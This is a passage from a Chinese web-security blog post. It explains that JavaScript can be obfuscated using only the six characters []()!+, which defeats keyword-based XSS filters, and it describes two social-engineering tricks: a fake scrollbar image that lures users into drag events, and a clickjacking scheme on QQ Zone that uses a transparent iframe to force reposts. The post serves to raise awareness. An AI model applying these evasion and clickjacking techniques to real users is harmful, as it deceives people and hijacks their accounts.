77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>。<br> 站名如其名，满满的恶意…它可以仅仅用 6 个字符：<code>[]()!+</code>去混淆编码 js。而且兼容性特别的完善。以下是我在最新 chrome 下的截图，将一句<code>alert(1)</code>编码成了 3009 个字符，并执行成功：<br><img src="/assets/blogImg/safety_004.jpg" alt="Alt text"><br> 所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p><h3 id="九、心理学与社会工程学" tabindex="-1"><a class="header-anchor" href="#九、心理学与社会工程学" aria-hidden="true">#</a> 九、心理学与社会工程学</h3><p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p><h4 id="_9-1-诱导触发拖拽事件" tabindex="-1"><a class="header-anchor" href="#_9-1-诱导触发拖拽事件" aria-hidden="true">#</a> 9.1）诱导触发拖拽事件</h4><p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？<br> 很简单，添加一张图片：<br><img src="/assets/blogImg/safety_005.jpg" alt="Alt text"><br> 注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p><h4 id="_9-2-传说中的-qq-空间-传染病毒" tabindex="-1"><a class="header-anchor" href="#_9-2-传说中的-qq-空间-传染病毒" aria-hidden="true">#</a> 9.2) 传说中的 QQ 空间“传染病毒”</h4><p>步骤是这样的：</p><ol><li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code></li><li>A 的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面</li><li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）</li><li>一传十十传百，越传越广…</li></ol><p>但真实的情况跟 CSRF 没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code><br> 这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br> 用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…</p><p>有人会问，这不是 CSRF 吗？还真不是。做法却很简单：<br> “有趣”的网站内嵌了一个 iframe，iframe 加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这 iframe 的透明度变为 0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。</p><p>以上。 End. 5.27 by litten.</p></div><!--[--><!--]--></div><footer class="page-meta"><!----><div class="meta-item last-updated"><span class="meta-item-label">Last Updated: </span><!----></div><div class="meta-item contributors"><span class="meta-item-label">Contributors: </span><span class="meta-item-info"><!--[--><!--[--><span class="contributor" title="email: zhang13pro@qq.com">LEX</span><!----><!--]--><!--]--></span></div></footer><!----><!--[--><!--]--></main><!--]--></div><!----><!--]--></div>
    <script type="module" src="/assets/app.3398e39f.js" defer></script>
  </body>
</html>
